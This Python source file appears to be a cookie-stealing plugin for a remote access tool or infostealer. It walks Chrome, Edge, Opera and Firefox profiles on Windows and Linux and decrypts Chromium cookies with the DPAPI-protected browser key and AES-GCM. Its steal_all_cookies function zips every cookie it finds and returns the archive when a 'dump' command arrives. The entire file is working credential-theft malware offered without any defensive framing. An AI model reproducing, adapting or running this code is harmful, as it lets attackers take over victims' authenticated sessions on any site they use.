import os
import sys
import shutil
import sqlite3
import base64
import tempfile
import zipfile
import json

# -- Para desencriptado de Chrome/Edge en Windows
try:
    import win32crypt
except ImportError:
    win32crypt = None
try:
    from Cryptodome.Cipher import AES
except ImportError:
    AES = None

def get_all_chrome_profiles(base_path):
    profiles = []
    if os.path.exists(base_path):
        for d in os.listdir(base_path):
            profile_dir = os.path.join(base_path, d)
            if os.path.isdir(profile_dir) and os.path.exists(os.path.join(profile_dir, "Cookies")):
                profiles.append(profile_dir)
    return profiles

def get_chrome_key_windows(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_chrome_cookie_win(enc_value, key):
    try:
        if enc_value[:3] == b'v10':
            iv = enc_value[3:15]
            payload = enc_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        else:
            return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode()
    except:
        return ""

def get_chrome_cookies_win(profile_path, browser_name, tempdir, result_zip):
    db_path = os.path.join(profile_path, 'Cookies')
    if not os.path.exists(db_path):
        return
    local_state_path = os.path.join(profile_path, '..', 'Local State')
    key = get_chrome_key_windows(local_state_path)
    temp_db = os.path.join(tempdir, f'{browser_name}_cookies.db')
    shutil.copy2(db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cookies = []
    try:
        cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
        for host_key, name, path_, enc_value in cursor.fetchall():
            valor = decrypt_chrome_cookie_win(enc_value, key)
            cookies.append(f"{host_key}\t{name}\t{path_}\t{valor}")
    except:
        pass
    finally:
        conn.close()
        os.remove(temp_db)
    if cookies:
        with open(os.path.join(tempdir, f'{browser_name}_cookies.txt'), 'w', encoding='utf-8', errors='ignore') as f:
            f.write('\n'.join(cookies))
        result_zip.write(os.path.join(tempdir, f'{browser_name}_cookies.txt'), arcname=f'{browser_name}_cookies.txt')
        os.remove(os.path.join(tempdir, f'{browser_name}_cookies.txt'))

def get_chrome_cookies_linux(profile_path, browser_name, tempdir, result_zip):
    db_path = os.path.join(profile_path, 'Cookies')
    if not os.path.exists(db_path):
        return
    temp_db = os.path.join(tempdir, f'{browser_name}_cookies.db')
    shutil.copy2(db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cookies = []
    try:
        cursor.execute("SELECT host_key, name, path, value FROM cookies")
        for host_key, name, path_, value in cursor.fetchall():
            cookies.append(f"{host_key}\t{name}\t{path_}\t{value}")
    except:
        pass
    finally:
        conn.close()
        os.remove(temp_db)
    if cookies:
        with open(os.path.join(tempdir, f'{browser_name}_cookies.txt'), 'w', encoding='utf-8', errors='ignore') as f:
            f.write('\n'.join(cookies))
        result_zip.write(os.path.join(tempdir, f'{browser_name}_cookies.txt'), arcname=f'{browser_name}_cookies.txt')
        os.remove(os.path.join(tempdir, f'{browser_name}_cookies.txt'))

def get_firefox_cookies(profile_path, browser_name, tempdir, result_zip):
    db_path = os.path.join(profile_path, 'cookies.sqlite')
    if not os.path.exists(db_path):
        return
    temp_db = os.path.join(tempdir, f'{browser_name}_cookies.db')
    shutil.copy2(db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cookies = []
    try:
        cursor.execute("SELECT host, name, path, value FROM cookies")
        for host, name, path_, value in cursor.fetchall():
            cookies.append(f"{host}\t{name}\t{path_}\t{value}")
    except:
        try:
            cursor.execute("SELECT host, name, path, value FROM moz_cookies")
            for host, name, path_, value in cursor.fetchall():
                cookies.append(f"{host}\t{name}\t{path_}\t{value}")
        except:
            pass
    finally:
        conn.close()
        os.remove(temp_db)
    if cookies:
        with open(os.path.join(tempdir, f'{browser_name}_cookies.txt'), 'w', encoding='utf-8', errors='ignore') as f:
            f.write('\n'.join(cookies))
        result_zip.write(os.path.join(tempdir, f'{browser_name}_cookies.txt'), arcname=f'{browser_name}_cookies.txt')
        os.remove(os.path.join(tempdir, f'{browser_name}_cookies.txt'))

def steal_all_cookies():
    tempdir = tempfile.mkdtemp()
    zip_path = os.path.join(tempdir, "all_cookies.zip")
    result_zip = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)

    # Chrome/Edge/Opera - WINDOWS
    chrome_base_win = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
    edge_base_win = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
    opera_base_win = os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable")
    for base_path, name in [
        (chrome_base_win, "Chrome"),
        (edge_base_win, "Edge"),
        (opera_base_win, "Opera")
    ]:
        for profile in get_all_chrome_profiles(base_path):
            get_chrome_cookies_win(profile, f"{name}_{os.path.basename(profile)}", tempdir, result_zip)

    # Chrome/Edge/Opera - LINUX
    chrome_base_linux = os.path.expanduser("~/.config/google-chrome/")
    edge_base_linux = os.path.expanduser("~/.config/microsoft-edge/")
    opera_base_linux = os.path.expanduser("~/.config/opera/")
    for base_path, name in [
        (chrome_base_linux, "Chrome"),
        (edge_base_linux, "Edge"),
        (opera_base_linux, "Opera")
    ]:
        for profile in get_all_chrome_profiles(base_path):
            get_chrome_cookies_linux(profile, f"{name}_{os.path.basename(profile)}", tempdir, result_zip)

    # Firefox - WIN/LINUX
    firefox_paths = []
    for base in [os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
                 os.path.expanduser("~/.mozilla/firefox/")]:
        if os.path.exists(base):
            firefox_paths += [os.path.join(base, d) for d in os.listdir(base)]
    for path in firefox_paths:
        get_firefox_cookies(path, os.path.basename(path), tempdir, result_zip)

    result_zip.close()
    with open(zip_path, "rb") as f:
        data = f.read()
    shutil.rmtree(tempdir, ignore_errors=True)
    return data

def run(cmd, *args):
    if cmd == "dump":
        data = steal_all_cookies()
        return data if data else b"NO COOKIES FOUND"
    else:
        return "[!] Comando no soportado en cookies."
